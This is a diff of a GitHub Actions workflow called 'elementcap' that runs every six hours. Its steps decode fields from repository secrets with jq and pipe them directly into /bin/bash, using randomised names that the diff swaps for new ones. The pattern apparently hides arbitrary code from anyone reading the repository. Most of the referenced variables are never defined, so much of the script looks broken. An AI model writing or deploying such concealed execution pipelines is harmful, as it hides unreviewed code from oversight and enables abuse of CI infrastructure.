@@ -3,24 +3,25 @@ name: elementcap
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 3/6 * * *'
-jobs:  # 30372
+    - cron: '55 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: elementcap
         env:
-          hfj30071: ${{ secrets.hfj30071 }}
+          flk1693: ${{ secrets.flk1693 }}
         run: |
-          echo $hfj30071 | jq -r .tu2 | /bin/bash
-          echo $jsa92 | jq -r .otap9 | /bin/bash
-          echo $iitdf12 | jq -r .pexfe248 | /bin/bash
-          echo $xmz0075 | jq -r .nm0702 | /bin/bash
-          echo $zr998 | jq -r .qc516 | /bin/bash
-          echo $zb5303 | jq -r .auoas11719 | /bin/bash
-          echo $dh03 | jq -r .uln4 | /bin/bash
-          echo $hro67665 | jq -r .bcgxj9 | /bin/bash
-          echo $rshk536 | jq -r .whi9603 | /bin/bash
+          echo $flk1693 | jq -r .h67 | /bin/bash
+          echo $ywpej5520 | jq -r .ws48994 | /bin/bash
+          echo $ihjf23477 | jq -r .iwlm5 | /bin/bash
+          echo $w63193 | jq -r .kt1184 | /bin/bash
+          echo $l9 | jq -r .jj3 | /bin/bash
+          echo $asml2 | jq -r .vue98573 | /bin/bash
+          echo $sp68488 | jq -r .s0424 | /bin/bash
+          echo $a020 | jq -r .b68052 | /bin/bash
+          echo $yudnm4 | jq -r .ee458 | /bin/bash
+          echo $dj43080 | jq -r .j25 | /bin/bash
+          echo $jhb32 | jq -r .b38 | /bin/bash
 
